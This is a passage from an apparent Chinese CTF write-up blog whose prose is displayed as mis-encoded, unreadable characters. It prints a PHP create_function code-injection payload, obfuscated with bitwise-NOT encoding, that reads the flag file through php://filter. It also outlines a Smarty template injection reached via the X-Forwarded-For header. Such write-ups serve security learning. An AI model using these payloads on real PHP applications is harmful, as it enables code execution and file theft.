class=mi>29</span><span class=o>%</span><span class=mi>29</span><span class=o>%</span><span class=mi>76</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>6</span><span class=n>d</span><span class=o>%</span><span class=mi>70</span><span class=o>%</span><span class=mi>28</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=n>e</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>76</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>28</span><span class=o>%</span><span class=mi>29</span><span class=o>%</span><span class=mi>29</span><span class=o>%</span><span class=mi>3</span><span class=n>b</span><span class=o>%</span><span class=mi>2</span><span class=n>f</span><span class=o>%</span><span class=mi>2</span><span class=n>f</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åå¾—åˆ°äº†ä¸€ä¸ªå‡çš„flagï¼šï¼ˆè„¸ä¸Šç¬‘å˜»å˜»</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201010161925745.png loading=lazy alt=image-20201010161925745></p><p>æ ¹æ®wpï¼Œé¢„æœŸè§£æ˜¯å–åç»•è¿‡ï¼š</p><p>payloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag[code]=create_function&amp;flag[arg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//
</span></span></code></pre></td></tr></table></div></div><p>æœ€åç»ˆäºæ‹¿åˆ°flagï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201010164915050.png loading=lazy alt=image-20201010164915050></p></li></ol><h2 id=the-mystery-of-ip>The mystery of ip</h2><p>é¦–å…ˆæ‰¾åˆ°hintï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201011110916069.png loading=lazy alt=image-20201011110916069></p><p>é¡ºç€hintéšä¾¿æ‰¾äº†ç¯‡æ–‡ç« ï¼š<a class=link href=https://blog.csdn.net/phpfenghuo/article/details/12853031 target=_blank rel=noopener>phpè·å–å®¢æˆ·ç«¯IPåœ°å€çš„å‡ ç§æ–¹æ³•</a></p><p>æµ‹è¯•äº†ä¸€ä¸‹å‘ç°æ˜¯XFFï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201011111624007.png loading=lazy alt=image-20201011111624007></p><p>å› ä¸ºå…ˆåšäº†Cookie is so stableè¿™ä¸€é¢˜ï¼Œä¸¤ä¸ªé¡µé¢å·®ä¸å¤šï¼Œè¿hintçš„ä½ç½®éƒ½ä¸€æ ·ï¼Œæ‰€ä»¥å…ˆè€ƒè™‘SSTIï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201011112628470.png loading=lazy alt=image-20201011112628470></p><p>æ ¹æ®ä¸Šé¢çš„å›¾æœ€åæµ‹è¯•å‡ºæ¥æ˜¯Smartyï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20220224112933460.png loading=lazy alt=image-20220224112933460></p><p>ç½‘ä¸Šæœpayloadç›´æ¥æ‰“ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20220224113834879.png loading=lazy alt=image-20220224113834879></p></section><footer class=article-footer><section class=article-tags><a href=/tags/wp/>Wp</a>
<a href=/tags/ctf/>Ctf</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js integrity=sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js integrity=sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05 crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{const e=[".main-article",".widget--toc"];e.forEach(e=>{const t=document.querySelector(e);t&&renderMathInElement(t,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],ignoredClasses:["gist"]})})})</script></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8Aweb/><div class=article-details><h2 class=article-title>2021ç¬¬äº”ç©ºé—´çº¿ä¸Šweb</h2></div></a></article><article><a href=/p/dasjuly-x-cbctf-4th-%E9%83%A8%E5%88%86wp/><div class=article-details><h2 class=article-title>DasJuly X CBCTF 4th éƒ¨åˆ†wp</h2></div></a></article><article><a href=/p/cybrics2021/><div class=article-details><h2 class=article-title>CyBRICS2021</h2></div></a></article><article><a href=/p/vnctf2021/><div class=article-details><h2 class=article-title>VNCTF2021</h2></div></a></article><article><a href=/p/2021%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF/><div class=article-details><h2 class=article-title>2021å¤§å‰å¤§åˆ©æ¯</h2></div></a></article></div></div></aside><div class=disqus-container></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>